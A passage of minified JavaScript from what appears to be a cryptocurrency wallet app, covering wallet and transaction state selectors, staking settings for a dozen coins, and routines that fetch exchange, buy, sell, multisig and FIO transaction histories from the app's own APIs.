                        await xc(setBalanceByWallet(t))
            }
              , updateTransactions = async (e, t) => {
                const a = undefined;
                Dc(Ic())(e) && xc(setTransactions(e, t))
            }
              , isWalletBalanceWasUpdatedByRest = e => isSelectedWalletBalanceUpdatedByRest(Ic())(e)
              , e = undefined
              , t = undefined
              , isWalletTransactionsWereUpdatedByRest = e => isSelectedWalletTxsUpdatedByRest(Ic())(e)
              , a = undefined
              , n = undefined
              , getAllTxs = () => Eu(Ic());
            return {
                getState: Ic,
                commitWalletUpdate,
                updateBalance,
                updateTransactions,
                getAllTxs,
                setWalletBalanceWasUpdatedByRest: e => xc(setWalletBalancesWereUpdatedByRest(e)),
                isWalletBalanceWasUpdatedByRest,
                setWalletTransactionsWereUpdatedByRest: e => xc(setWalletTxsWereUpdatedByRest(e)),
                isWalletTransactionsWereUpdatedByRest,
                setWalletBalanceUpdateStatus: e => xc(Ac.Nw.setWalletBalanceUpdateStatus(e)),
                setWalletTransactionsUpdateStatus: e => xc(Ac.Nw.setWalletTransactionsUpdateStatus(e))
            }
        }
          , initializeWalletsModels = e => {
            const t = [];
            e.forEach((e => {
                if (!_e.ZP.isSupported(e) || e instanceof to.Z)
                    t.push(e);
                else {
                    const a = undefined
                      , n = (new (_e.ZP.getClass(e))).recoverFromPlainObject(e);
                    n.setStoreManager(getStoreManager());
                    t.push(n)
                }
            }
            ));
            return t
        }
          , Pc = ["trx", "atom", "xtz", "one", "ont", "eth", "ada-shelley", "zil", "now", "kmd", "clo", "qtum"]
          , Lc = {
            trx: 1,
            atom: 0,
            xtz: 0,
            one: 100,
            ont: 1,
            eth: .1,
            "ada-shelley": 10,
            zil: 10,
            now: 10,
            kmd: 10,
            clo: 0,
            qtum: 0
        }
          , Fc = {
            trx: "14 days",
            atom: "21 days",
            xtz: "No lock-up",
            one: "~ 1,5 days",
            ont: "~ 7 days",
            eth: "No lock-up (possible to exchange GETH back to ETH)",
            "ada-shelley": "No lock-up",
            zil: "No lock-up",
            now: "7 days",
            kmd: "No lock-up",
            clo: "1 month",
            qtum: "18 hours"
        }
          , getStakingWallets = e => {
            let {wallets: t} = e;
            const a = t.filter((e => -1 !== Pc.indexOf(e.currency)))
              , n = t.reduce(( (e, t) => {
                if ("bnb" === t.currency && t.subWallets.length) {
                    const a = t.subWallets.find((e => "now" === e.ticker || "now-e68" === e.currency));
                    a && e.push(a)
                }
                return e
            }
            ), []);
            n.length && a.push(...n);
            return a
        }
          , getBestBalanceStakingWallets = e => {
            let {wallets: t} = e;
            const a = {}
              , n = undefined;
            getStakingWallets({
                wallets: t
            }).forEach((e => {
                a[e.currency] ? (0,
                Ko.gt)(e.balance, a[e.currency].balance) && (a[e.currency] = e) : a[e.currency] = e
            }
            ));
            return Object.values(a)
        }
          , getMinStakingAmountByTicker = e => {
            let {ticker: t} = e;
            return Lc[t]
        }
          , getURLForNewStakingAction = e => {
            let {ticker: t, uuid: a, balance: n} = e
              , r = (0,
            M.RU)();
            if ((0,
            Ko.eg)(0, n))
                return `${(0,
                M.RU)()}/buy?walletTo=${a}`;
            switch (t) {
            case "zil":
                r = `${(0,
                M.RU)()}/staking-zil?walletFrom=${a}`;
                break;
            case "ada-shelley":
                r = `${(0,
                M.RU)()}/staking-ada/staking?walletFrom=${a}`;
                break;
            case "eth":
                r = `${(0,
                M.RU)()}/staking-eth?walletFrom=${a}`;
                break;
            case "xtz":
                r = `${(0,
                M.RU)()}/staking-xtz/staking?walletFrom=${a}`;
                break;
            case "trx":
                r = `${(0,
                M.RU)()}/staking-trx?walletFrom=${a}`;
                break;
            case "clo":
                r = `${(0,
                M.RU)()}/staking-clo/staking?walletFrom=${a}`;
                break;
            case "atom":
                r = `${(0,
                M.RU)()}/staking-atom/staking?walletFrom=${a}`;
                break;
            case "one":
                r = `${(0,
                M.RU)()}/staking-one/staking?walletFrom=${a}`;
                break;
            case "ont":
                r = `${(0,
                M.RU)()}/staking-ont?walletFrom=${a}`;
                break;
            case "now":
                r = `${(0,
                M.RU)()}/staking-bnb/staking?walletFrom=${a}`;
                break;
            case "qtum":
                r = `${(0,
                M.RU)()}/staking-qtum/staking?walletFrom=${a}`;
                break;
            case "kmd":
                r = `${(0,
                M.RU)()}/receive?wallet=${a}`;
                break;
            default:
                return r
            }
            return r
        }
          , getButtonTitleForNewStakingAction = e => {
            let {balance: t, ticker: a, withTicker: n=!1} = e;
            return (0,
            Ko.eg)(0, t) ? n ? `Buy ${a.toUpperCase()}` : "Buy to Stake" : "Stake"
        }
          , getStakingLockUpPeriodByTicker = e => {
            let {ticker: t} = e;
            const a = undefined;
            return Fc[t] || "—"
        }
          , getTicker = e => {
            const t = e.ticker || e.currency;
            return "ada-shelley" === t ? "ada" : "now-e68" === t ? "now" : t
        }
        ;
        var Wc = a(18600);
        const Rc = "wallets"
          , walletsStateSelector = e => e.wallets
          , Bc = (0,
        _t.P1)(walletsStateSelector, (e => {
            let {wallets: t} = e;
            return null != t ? t : []
        }
        ))
          , Oc = (0,
        _t.P1)([walletsStateSelector, (e, t) => t], ( (e, t) => {
            let {walletAdditionalInfo: a} = e;
            return a[t]
        }
        ))
          , Dc = oe.yi
          , Mc = (0,
        _t.P1)(walletsStateSelector, (e => {
            let {multisigs: t} = e;
            return null != t ? t : []
        }
        ))
          , Uc = (0,
        _t.P1)(walletsStateSelector, (e => {
            let {balances: t} = e;
            return null != t ? t : {}
        }
        ))
          , Gc = (0,
        _t.P1)(walletsStateSelector, (e => {
            let {activeWalletId: t} = e;
            return t
        }
        ))
          , Vc = (0,
        _t.P1)(walletsStateSelector, (e => {
            let {walletsMnemonic: t} = e;
            return t
        }
        ))
          , Kc = (0,
        _t.P1)(Uc, (e => t => e[t]))
          , Hc = (0,
        _t.P1)([Mc, Kc], ( (e, t) => a => {
            const mapMultisig = (e, n) => ({
                ...e,
                privateKey: a.privateKey,
                address: e.walletAddressData,
                title: `${a.title} Multisig ${n + 1}`,
                uuid: e.multisigId,
                family: e.family,
                currency: e.currency,
                balance: t(e.multisigId) || "0"
            })
              , n = e.filter((e => e.participants.find((e => e.data === a.publicKey)))).map(( (e, t) => mapMultisig(e, t)))
              , r = e.filter((e => e.participants.find((e => e.data === a.address)))).map(( (e, t) => mapMultisig(e, t)));
            return n.concat(r)
        }
        ))
          , isSelectedWalletBalanceUpdatedByRest = e => t => e.wallets.walletsUpdatedBalancesByRest && Object.keys(e.wallets.walletsUpdatedBalancesByRest).includes(t)
          , isSelectedWalletTxsUpdatedByRest = e => t => e.wallets.walletsUpdatedTxsByRest && Object.keys(e.wallets.walletsUpdatedTxsByRest).includes(t)
          , zc = (0,
        _t.P1)(walletsStateSelector, (e => e.isLoadingCreatingWallet))
          , jc = (0,
        _t.P1)(walletsStateSelector, (e => e.newCreatedWalletId))
          , filterEthGethWallets = e => e.map((e => {
            try {
                var t;
                if ("eth" !== (null === (t = e.data) || void 0 === t ? void 0 : t.currency))
                    return e;
                if (0 === e.subWallets.length)
                    return e;
                const a = undefined;
                if (!e.subWallets.find((e => {
                    var t;
                    return "0x3802c218221390025bceabbad5d8c59f40eb74b8" === (null === (t = e.smartContract) || void 0 === t ? void 0 : t.toLowerCase())
                }
                )))
                    return e;
                e.subWallets = [...e.subWallets.filter((e => {
                    var t;
                    return "0x9ad03c34aab604a9e0fde41dbf8e383e11c416c4" !== (null === (t = e.data.smartContract) || void 0 === t ? void 0 : t.toLowerCase())
                }
                ))];
                return e
            } catch (t) {
                console.log("Failed to filter custom wallet", t);
                return e
            }
        }
        ))
          , customFilterWallet = e => filterEthGethWallets(e)
          , withSelectedWallets = (e, t, a) => {
            try {
                const n = initializeWalletsModels(e);
                n.forEach((e => {
                    const n = patchWalletTitle(e)
                      , r = a(n);
                    r && r.length > 0 && (n.multisigs = r);
                    (e.multisigs || []).forEach((e => {
                        const a = t(e.uuid);
                        null != a && (e.balance = a)
                    }
                    ));
                    e.subWallets.forEach((e => {
                        const a = t(e.uuid);
                        null != a && (e.balance = a)
                    }
                    ));
                    const l = t(n.uuid);
                    null != l && (n.balance = l)
                }
                ));
                return customFilterWallet(n.filter((e => e && e.currency)))
            } catch (e) {
                Wc.i2.error("initializeWalletsModels reducer failed", e);
                throw e
            }
        }
          , $c = (0,
        _t.P1)([Bc, Kc, Hc], withSelectedWallets)
          , Zc = (0,
        _t.P1)($c, (e => {
            null == e || e.forEach((e => {
                var t;
                const a = e.clone();
                a.subWallets = null === (t = a.subWallets) || void 0 === t ? void 0 : t.filter((e => (0,
                Ko.gt)(e.balance, 0)))
            }
            ));
            return null == e ? void 0 : e.filter((e => {
                var t;
                return (null == e || null === (t = e.subWallets) || void 0 === t ? void 0 : t.length) || (0,
                Ko.gt)(e.balance, 0)
            }
            ))
        }
        ))
          , Yc = (0,
        _t.P1)($c, (e => e.filter((e => !e.isWatchOnly))))
          , qc = (0,
        _t.P1)(Zc, (e => e.filter((e => !e.isWatchOnly))))
          , Xc = (0,
        _t.P1)($c, (e => e.reduce(( (e, t) => e.concat(t.subWallets)), [])))
          , selectedMultisigsAddresses = e => ((null == e ? void 0 : e.wallets.multisigs) || []).map((e => e.walletAddressData))
          , Qc = (0,
        _t.P1)($c, (e => e.filter((e => e.hw)).map((e => e.address)).map((e => (0,
        Ho.t)(e)))))
          , Jc = (0,
        _t.P1)($c, (e => e.filter((e => e.isWatchOnly)).map((e => e.address)).map((e => (0,
        Ho.t)(e)))))
          , eu = (0,
        _t.P1)($c, (e => t => {
            try {
                if (!e || !e.length)
                    return null;
                let a = e.find((e => e.uuid === t));
                a || e.forEach((e => {
                    a || (a = e.subWallets.find((e => e.uuid === t)));
                    !a && e.multisigs && (a = e.multisigs.find((e => e.uuid === t)))
                }
                ));
                return a || null
            } catch (e) {
                Wc.i2.error("selectedWalletById reducer failed", e);
                return null
            }
        }
        ))
          , tu = (0,
        _t.P1)([Gc, eu], ( (e, t) => {
            const a = t(e);
            return a && a.data ? a : a ? patchWalletTitle(a) : null
        }
        ))
          , au = (0,
        _t.P1)($c, (e => (t, a) => {
            try {
                return e.find((e => {
                    const n = (0,
                    Ho.t)(e.address) === (0,
                    Ho.t)(t) || e.accountName && e.accountName === t;
                    return a ? e.currency === a && n : n
                }
                ))
            } catch (e) {
                Wc.i2.error("selectedWalletByAddress reducer failed", e);
                throw e
            }
        }
        ))
          , nu = (0,
        _t.P1)(Xc, (e => (t, a) => {
            try {
                return e.find((e => {
                    const n = (0,
                    Ho.t)(e.address) === (0,
                    Ho.t)(t) || e.accountName && e.accountName === t;
                    let r = !0;
                    e.family && e.family === e.currency && e.smartContract && (r = !1);
                    return a ? e.currency === a && n && r : n && r
                }
                ))
            } catch (e) {
                Wc.i2.error("selectedSubWalletByAddress reducer failed", e);
                throw e
            }
        }
        ))
          , ru = (0,
        _t.P1)($c, (e => getStakingWallets({
            wallets: e
        })))
          , lu = (0,
        _t.P1)($c, (e => t => {
            try {
                const a = undefined;
                return initializeWalletsModels(e).find((e => {
                    let a = e.subWallets.some((e => e.uuid === t));
                    !a && e.multisigs && (a = e.multisigs.some((e => e.uuid === t)));
                    return a
                }
                )) || null
            } catch (e) {
                Wc.i2.error("selectedParentWalletById reducer failed", e);
                throw e
            }
        }
        ))
          , su = (0,
        _t.P1)([jc, eu], ( (e, t) => {
            const a = t(e);
            return a && a.data ? a : a ? patchWalletTitle(a) : null
        }
        ))
          , iu = (0,
        _t.P1)(walletsStateSelector, (e => e.errorCreatingWallet))
          , ou = "transactions"
          , cu = ee.P.create({
            name: "reducer-transactions"
        })
          , uu = ["txs", "exchangeTxs", "pendingTxs", "multisigTxs", "buyTxs", "sellTxs", "fioTxs"]
          , du = ["exchangeTxs", "pendingTxs", "multisigTxs", "buyTxs", "sellTxs", "fioTxs"]
          , mu = {
            txs: [],
            exchangeTxs: [],
            pendingTxs: {},
            multisigTxs: [],
            buyTxs: [],
            sellTxs: [],
            fioTxs: []
        }
          , selectCommonTransactions = e => e[ou].txs || []
          , selectedPendingTxs = e => Object.keys(e[ou].pendingTxs || []).map((t => e[ou].pendingTxs[t]))
          , selectedExchangeTxs = e => e[ou].exchangeTxs || []
          , selectedMultisigTxs = e => e[ou].multisigTxs
          , selectedBuyTxs = e => e[ou].buyTxs || []
          , selectedSellTxs = e => e[ou].sellTxs || []
          , selectedFioTxs = e => e[ou].fioTxs || []
          , selectTransactions = e => e[ou]
          , pu = (0,
        _t.P1)(selectTransactions, (e => {
            let {txs: t} = e;
            return t
        }
        ))
          , fu = (0,
        _t.P1)(selectTransactions, (e => {
            let {pendingTxs: t} = e;
            return t
        }
        ))
          , isValidCurrency = e => /^[A-Za-z0-9]+$/.test(e || "")
          , Eu = (0,
        _t.P1)([fu, pu], ( (e, t) => {
            const a = getUniqueGethDepositTxs(t)
              , n = Object.values(e).concat(t).concat(a).sort(( (e, t) => {
                if (e.timestamp !== t.timestamp)
                    return e.timestamp < t.timestamp ? 1 : -1;
                if (e.isIncoming !== t.isIncoming) {
                    var a, n;
                    return (null !== (a = e.isIncoming) && void 0 !== a && a) < (null !== (n = t.isIncoming) && void 0 !== n && n) ? 1 : -1
                }
                if (e.amount !== t.amount) {
                    var r, l;
                    return (null !== (r = e.amount) && void 0 !== r ? r : 0) < (null !== (l = t.amount) && void 0 !== l ? l : 0) ? 1 : -1
                }
                if (e.hash !== t.hash) {
                    var s, i;
                    return (null !== (s = e.hash) && void 0 !== s ? s : "") > (null !== (i = t.hash) && void 0 !== i ? i : "") ? 1 : -1
                }
                return e.primaryKey > t.primaryKey ? -1 : 1
            }
            ))
              , r = [...new Map([...n].map((e => [e.primaryKey, e]))).values()]
              , l = "s1Nc7XLPcgVVRBYtMUAkKGPmihkwxgfmSgr";
            return r.filter(Boolean).filter((e => e.addressFrom !== l && e.addressTo !== l && (isValidCurrency(e.currencyFrom) || isValidCurrency(e.currencyTo) || isValidCurrency(e.currencyTx))))
        }
        ));
        function mergeAndUniqBy(e, t) {
            const a = {};
            return e.filter((e => {
                const n = t(e);
                if (a[n] && a[n].status) {
                    if (a[n].item.family && !e.family && a[n].item.family !== e.currencyFrom) {
                        Object.assign(e, a[n].item);
                        return !1
                    }
                    if (!a[n].item.family && e.family && e.family !== a[n].item.currencyFrom) {
                        Object.assign(a[n].item, e);
                        return !1
                    }
                    parseInt(String(e.confirmations), 10) > parseInt(String(a[n].item.confirmations), 10) ? Object.assign(a[n].item, e) : Object.assign(e, a[n].item);
                    return !1
                }
                a[n] = {
                    status: !0,
                    item: e
                };
                return !0
            }
            ))
        }
        const hu = (0,
        te.createReducer)(mu).handleAction(gc, ( () => mu)).handleAction(yc, ( (e, t) => {
            let {payload: {txs: a}} = t;
            return {
                ...e,
                txs: a
            }
        }
        )).handleAction(fc, ( (e, t) => {
            let {payload: {txs: a}} = t;
            const n = [...e.buyTxs, ...a];
            return {
                ...e,
                buyTxs: n
            }
        }
        )).handleAction(pc, ( (e, t) => {
            let {payload: {txs: a}} = t;
            return {
                ...e,
                sellTxs: a
            }
        }
        )).handleAction(mc, ( (e, t) => {
            let {payload: {txs: a}} = t;
            return {
                ...e,
                exchangeTxs: a
            }
        }
        )).handleAction(Ec, ( (e, t) => {
            let {payload: {txs: a}} = t;
            return {
                ...e,
                multisigTxs: a
            }
        }
        )).handleAction(hc, ( (e, t) => {
            let {payload: {txs: a}} = t;
            return {
                ...e,
                fioTxs: a
            }
        }
        )).handleAction(dc, ( (e, t) => {
            var a;
            let {payload: {tx: n}} = t;
            const r = e.pendingTxs || {};
            Object.assign(r, {
                [null !== (a = n.hash) && void 0 !== a ? a : "null"]: n
            });
            return {
                ...e,
                pendingTxs: {
                    ...r
                }
            }
        }
        )).handleAction(uc, ( (e, t) => {
            let {payload: {txs: a, wallets: n}} = t;
            try {
                if (!a)
                    return e;
                const t = a.map(Vo.v).concat(e.txs)
                  , r = e.pendingTxs || {}
                  , l = t.filter((e => "btc" === e.family && "btc" !== e.currencyFrom))
                  , s = new Map(l.map((e => [e.hash || "", e])));
                delete r.null;
                let i = t.map((e => {
                    e.hash && delete r[e.hash];
                    if ("bchsv" === e.currencyFrom) {
                        e.currencyFrom = "bsv";
                        e.currencyTo = "bsv"
                    }
                    "string" == typeof e.timestamp && (e.timestamp = new Date(e.timestamp).getTime());
                    const t = e.hash && s.get(e.hash);
                    return t && t.currencyFrom !== e.currencyFrom ? null : ("bsv" !== e.currencyFrom && "bch" !== e.currencyTo || Number(e.amount)) && ("trx" !== e.family || e.addressFrom) ? e : null
                }
                )).filter(Boolean);
                const o = n.filter((e => e.multisigs)).reduce(( (e, t) => e.concat(t.multisigs)), []);
                i = mergeAndUniqBy(i, (e => e.primaryKey));
                i = merge_exchange_tx(i, e.exchangeTxs);
                i = mergeBuyTransactions(i, e.buyTxs);
                i = mergeSellTxs(i, e.sellTxs);
                i = merge_fio(i, e.fioTxs);
                i = merge_multisigs(i, o);
                i = merge_multisigs(i, e.multisigTxs);
                i.map((e => {
                    e.primaryKey = (0,
                    Vo.u)(e);
                    return e
                }
                ));
                i = filterMintingEthTxs(i);
                return {
                    ...e,
                    pendingTxs: r,
                    txs: i
                }
            } catch (e) {
                cu.error("ADD_TRANSACTION reducer failed", e);
                throw e
            }
        }
        )).handleAction(ne, ( () => mu));
        let gu = [], yu, vu = 0;
        const setTransactions = (e, t) => async (a, n) => {
            if (Dc(n())(e)) {
                gu = gu.concat(t || []);
                Date.now() - vu < 1e3 && window.clearTimeout(yu);
                if (gu.length) {
                    vu = Date.now();
                    yu = window.setTimeout(( () => {
                        if (!Dc(n())(e)) {
                            gu = [];
                            return
                        }
                        if (!(0,
                        oe.Oj)(n()))
                            return;
                        const t = $c(n());
                        a(uc({
                            txs: gu,
                            wallets: t
                        }));
                        gu = []
                    }
                    ), 1e3)
                }
            } else
                gu = []
        }
          , transactions_addPendingTx = e => t => {
            try {
                Object.assign(e, {
                    timestamp: Date.now(),
                    confirmations: 0
                });
                t(dc({
                    tx: e
                }))
            } catch (e) {
                cu.error("addPendingTx reducer failed", e)
            }
        }
          , triggerAddTransactions = e => {
            let {actionCreator: t, txs: a} = e;
            return async (e, n) => {
                const r = n()
                  , l = $c(r);
                if (a && a.length) {
                    e(t({
                        txs: a
                    }));
                    e(uc({
                        txs: [],
                        wallets: l
                    }))
                }
            }
        }
          , removeFioTransactionByRequestId = e => async (t, a) => {
            const n = a()
              , r = selectedFioTxs(n)
              , l = Eu(n)
              , s = r.filter((t => t.fio_request_id !== e))
              , i = l.filter((t => {
                const a = t.original;
                return (null == a ? void 0 : a.fio_request_id) !== e
            }
            ));
            await t(triggerAddTransactions({
                actionCreator: hc,
                txs: s
            }));
            t(yc({
                txs: i
            }))
        }
          , replaceTxs = e => async t => {
            t(yc({
                txs: e
            }))
        }
          , removeTransactionsByWallet = e => async (t, a) => {
            try {
                const n = a()
                  , r = undefined
                  , l = Eu(n).filter((t => t.sourceWalletId !== e.uuid));
                t(yc({
                    txs: l
                }))
            } catch (e) {
                cu.error("removeTransactionsByWallet reducer failed", e)
            }
        }
          , fetchExchangeTransactions = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
            return async (t, a) => {
                const n = a()
                  , r = undefined;
                if (!0 === Bo(a()) && !1 === e)
                    return;
                const l = undefined
                  , s = $c(n).reduce(( (e, t) => {
                    e.push([t.currency, t.address]);
                    t.subWallets.forEach((t => {
                        e.push([t.currency, t.address])
                    }
                    ));
                    return e
                }
                ), []);
                try {
                    if (0 === s.length)
                        return;
                    const e = 50
                      , a = "/exchange/v1/api/get-transactions"
                      , n = [];
                    let r = [];
                    for (let t = 0; t < s.length; t++) {
                        r.push(s[t]);
                        if (r.length >= e) {
                            n.push(U.Ed.post(a, {
                                addresses: r
                            }));
                            r = []
                        }
                        if (t === s.length - 1 && 0 !== r.length) {
                            n.push(U.Ed.post(a, {
                                addresses: r
                            }));
                            r = []
                        }
                    }
                    const l = await Promise.all(n);
                    let i = [];
                    for (let e = 0; e < l.length; e++) {
                        const {data: t} = l[e]
                          , a = t.exchanges;
                        i = [...i, ...a]
                    }
                    t(mc({
                        txs: i.map(fromThirdPartyService.bind(null, "changenow"))
                    }))
                } catch (e) {
                    cu.error("fetchExchangeTransactions reducer failed", e)
                }
            }
        }
          , guardarianTransactionsToBuyTransactions = e => {
            const t = undefined;
            return e.map((e => ({
                timestamp: e.createdDate,
                status: e.status,
                address: e.originalTransaction.payoutAddress,
                currencyTo: e.originalTransaction.toCurrency.toLowerCase(),
                amountTo: e.originalTransaction.toAmount,
                currencyFrom: e.originalTransaction.fromCurrency.toLowerCase(),
                amountFrom: e.originalTransaction.fromAmount,
                paymentId: e.originalTransaction.id
            })))
        }
          , fetchBuyTransactions = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
            return async (t, a) => {
                const n = a()
                  , r = undefined;
                if (!0 === Bo(a()) && !1 === e)
                    return;
                const l = $c(n)
                  , s = (await getCurrencies({
                    side: "buy",
                    abortController: new AbortController
                })).coinList
                  , i = l.reduce(( (e, t) => {
                    s.indexOf(t.currency) > -1 && e.push([t.currency, t.address]);
                    t.subWallets.forEach((a => {
                        s.indexOf(t.currency) > -1 && e.push([a.currency, a.address])
                    }
                    ));
                    return e
                }
                ), []);
                try {
                    const e = i.map((e => {
                        let[,t] = e;
                        return t
                    }
                    ))
                      , a = await getGuardarianTransactionByAddresses(e)
                      , n = guardarianTransactionsToBuyTransactions(a);
                    t(triggerAddTransactions({
                        actionCreator: fc,
                        txs: n
                    }))
                } catch (e) {
                    cu.error("Error during fetchBuyTransactions", e)
                }
                if (i.length)
                    try {
                        const {data: e} = await U.nW.post("/api/v1/buy/get-txs-by-addresses", {
                            addresses: i
                        });
                        t(triggerAddTransactions({
                            actionCreator: fc,
                            txs: e.txs
                        }))
                    } catch (e) {
                        cu.error("Error during fetchBuyTransactions", e)
                    }
            }
        }
          , fetchSellTransactions = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
            return async (t, a) => {
                const n = a()
                  , r = undefined;
                if (!0 === Bo(a()) && !1 === e)
                    return;
                const l = $c(n)
                  , s = (await getCurrencies({
                    side: "sell",
                    abortController: new AbortController
                })).coinList
                  , i = l.reduce(( (e, t) => {
                    s.indexOf(t.currency) > -1 && e.push([t.currency, t.address]);
                    return e
                }
                ), []);
                if (i.length)
                    try {
                        const {data: e} = await U.nW.post("/api/v1/sell/get-txs-by-addresses", {
                            addresses: i
                        });
                        t(triggerAddTransactions({
                            actionCreator: pc,
                            txs: e.txs
                        }))
                    } catch (e) {
                        cu.error("Error during fetchBuyTransactions", e)
                    }
            }
        }
          , fetchFioInvoices = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
            return async (t, a) => {
                const n = a()
                  , r = undefined;
                if (!0 === Bo(a()) && !1 === e)
                    return;
                const l = $c(n)
                  , s = await Se.Z.getApiByCurrency("fio");
                let i = [];
                const o = selectedFioTxs(n);
                for (const e of l)
                    if ("fio" === e.currency) {
                        const a = {
                            addressFrom: e.address,
                            privateKey: e.privateKey
                        }
                          , n = [...o].filter((t => t.payee_fio_public_key === e.address || t.payer_fio_public_key === e.address));
                        try {
                            let t = []
                              , r = []
                              , l = [];
                            const o = n.filter((e => "fio-pending" === e.type));
                            try {
                                t = await s.fetchPendingInvoices({
                                    ...a,
                                    seen: o
                                })
                            } catch (e) {
                                console.warn(e)
                            }
                            const c = n.filter((e => "fio-sent" === e.type || "fio-appruved" === e.type));
                            try {
                                r = await s.fetchSentInvoices({
                                    ...a,
                                    seen: c
                                })
                            } catch (e) {
                                console.warn(e)
                            }
                            const u = n.filter((e => "fio-appruved" === e.type));
                            try {
                                l = await s.fetchUpdatedInvoices({
                                    ...a,
                                    seen: u
                                })
                            } catch (e) {
                                console.warn(e)
                            }
                            i = i.concat([...t.map((t => Object.assign(t, {
                                type: "fio-pending",
                                isIncoming: e.address === t.payer_fio_public_key
                            }))), ...r.map((t => {
                                var a;
                                return Object.assign(t, {
                                    type: "fio-sent",
                                    isIncoming: e.address === t.payer_fio_public_key,
                                    amount: null == t || null === (a = t.content) || void 0 === a ? void 0 : a.amount
                                })
                            }
                            )), ...l.map((t => Object.assign(t, {
                                type: "fio-appruved",
                                isIncoming: e.address === t.payer_fio_public_key
                            })))])
                        } catch (t) {
                            cu.error("failed get fio", e.address, t)
                        }
                        if (i.length) {
                            i = [...o].concat(i);
                            const e = []
                              , a = new Map;
                            for (const t of i) {
                                const n = t.fio_request_id + t.isIncoming.toString() + t.type + t.status;
                                if (!a.has(n)) {
                                    a.set(n, !0);
                                    e.push(t)
                                }
                            }
                            t(triggerAddTransactions({
                                actionCreator: hc,
                                txs: e
                            }))
                        }
                    }
            }
        }
          , fetchMultisigTransactions = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
            return async (t, a) => {
                const n = a()
                  , r = undefined;
                if (!0 === Bo(a()) && !1 === e)
                    return;
                const l = $c(n)
                  , s = l.reduce(( (e, t) => {
                    t && t.multisigs && t.multisigs.map((e => e.walletType === we._h.BITCOIN ? [e.currency, e.walletAddressData] : [e.currency, e.transactionHash])).forEach((t => {
                        e.some((e => e.includes(t[1]))) || e.push(t)
                    }
                    ));
                    return e
                }
                ), []);
                if (0 !== s.length) {
                    try {
                        const {data: e} = await U.nW.post("/api/v1/internal/multisigs/transactions", {
                            addresses: s
                        })
                          , a = [];
                        for (const t of e.response) {
                            var i;
                            const e = await Se.Z.getApiByMultisigTransaction(t);
                            t.hash = null === (i = t.states.filter((e => e.transactionHash))[0]) || void 0 === i ? void 0 : i.transactionHash;
                            if (t.walletType === we._h.BITCOIN || t.states.some((e => e.nonce)))
                                a.push(t);
                            else if (e) {
                                const n = t.states.sort(( (e, t) => e.createdAt < t.createdAt ? 1 : -1)).find((e => e.transactionData)).transactionData
                                  , r = undefined;
                                if (await (null == e ? void 0 : e.isTransactionMined(n))) {
                                    const n = await e.getMultisigAddress(t.walletAddressData)
                                      , r = await e.getMultisigNonce(n, t.destination, t.amount);
                                    await U.nW.post(`/api/v1/internal/multisigs/transactions/${t.transactionId}`, {
                                        nonce: r
                                    });
                                    t.states.push({
                                        nonce: r
                                    });
                                    a.push(t)
                                }
                            }
                        }
                        t(triggerAddTransactions({
                            actionCreator: Ec,
                            txs: a
                        }))
                    } catch (e) {
                        cu.error(e, "fetchMultisigTransactions reducer failed")
                    }
                    for (const e of l) {
                        const a = await Se.Z.loadLightAdapterByWallet(e);
                        if (e.multisigs)
                            for (const n of e.multisigs) {
                                let r = await (null == a ? void 0 : a.getTransactionsByAddress({
                                    address: n.walletAddressData,
                                    currency: n.currency
                                }));
                                const l = (0,
                                Ae.k)(r);
                                null != l && l.length && t(setTransactions(e, l))
                            }
                    }
                }
            }
        }
          , updateExchangeTx = (e, t) => async () => {
            await U.Ed.put("/exchange/v1/api/update-transaction", {
                exchangeId: e,
                ...t
            })
        }
        ;
        ft.on("migrations-complete", (e => {
            let {version: t, dispatch: a, getStore: n} = e;
            try {
                cu.log("Migration complete", t);
                if (14 === t) {
                    a(fetchExchangeTransactions());
                    a(fetchBuyTransactions());
                    const e = n();
                    if (e && e.transactions && e.transactions.txs && Array.isArray(e.transactions.txs)) {
                        const t = e.transactions.txs.filter((e => "bsv" !== e.currencyFrom && "bch" !== e.currencyFrom && "bch" !== e.currencyTo && "bsv" !== e.currencyTo));
                        a(yc({
                            txs: t
                        }))
                    }
                }
                if (19 === t) {
                    const e = n()
                      , t = undefined
                      , r = $c(e).filter((e => e && "eos" === e.currency));
                    if (0 === r.length)
                        return;
                    let l = r.map((e => e.address));
                    l = l.concat(r.filter((e => e.accountName)).map((e => e.accountName)).filter((e => "string" == typeof e)));
                    const s = selectCommonTransactions(e);
                    if (0 === s.length)
                        return;
                    const i = s.filter((e => {
                        var t, a;
                        return "eos" !== e.family || l.includes(null !== (t = e.addressFrom) && void 0 !== t ? t : "undefined") || l.includes(null !== (a = e.addressTo) && void 0 !== a ? a : "undefined")
                    }
                    ));
                    a(replaceTxs(i))
                }
                if (22 === t) {
                    a(fetchExchangeTransactions());
                    a(fetchBuyTransactions());
                    a(fetchSellTransactions());
                    const e = n()
                      , t = selectCommonTransactions(e);
                    if (t.length) {
                        const e = t.filter((e => "xzc" !== e.currencyFrom && "xzc" !== e.currencyTo));
                        a(replaceTxs(e))
                    }
                }
            } catch (e) {
                console.warn(e)
            }
        }
        ));
        const _u = ee.P.create({
            name: "wallet-updater"
        })
          , updateInternalTxs = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
            return t => {
                try {
                    t(fetchExchangeTransactions(e))
                } catch (e) {
                    _u.error("Fail fetched exchange transactions")
                }
                try {
                    t(fetchBuyTransactions(e))
                } catch (e) {
                    _u.error("Fail fetched buy transactions")
                }
                try {
                    t(fetchSellTransactions(e))
                } catch (e) {
                    _u.error("Fail fetched sell transactions")
                }
                try {
                    t(fetchMultisigTransactions(e))
                } catch (e) {
                    _u.error("Fail fetched multisig transactions")
                }
                try {
                    t(fetchMultisigs(e))
                } catch (e) {
                    _u.error("Fail fetched multisigs")
                }
                try {
                    t(fetchFioInvoices(e))
                } catch (e) {
                    _u.error("Fail fetched fio invoices")
                }
            }
        };
        var wu = a(45860)
          , bu = a(57506);
        function hasMultisigByWallet(e) {
            return !(!e.isMultisigsShow || !e.publicKey && e.type !== we.uQ.ETH_LIKE_WALLET)
        }
        const updateTxsByWallet = e => async () => {
            e instanceof to.Z && ro.isNeedToUpdateWalletTxsByRest(e) && await e.updateTransactions()
        }
          , updateBalanceByWallet = function(e) {
            let t = !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
            return async a => {
                if (e instanceof to.Z && ro.isNeedToUpdateWalletBalanceByRest(e)) {
